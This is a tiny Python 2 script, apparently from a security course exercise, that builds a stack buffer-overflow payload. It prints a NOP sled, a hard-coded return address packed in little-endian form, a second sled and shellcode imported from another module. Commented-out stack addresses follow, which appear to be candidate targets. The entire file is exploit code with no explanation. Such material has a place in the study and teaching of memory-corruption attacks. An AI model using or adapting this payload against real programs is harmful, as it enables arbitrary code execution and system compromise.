from shellcode import shellcode
from struct import pack
nops = '\x90'*1036
print nops+pack("<I",0xbffeaa2c)+nops+shellcode
#0xbffee718
#buff = 0xbffee720
#0xbffea958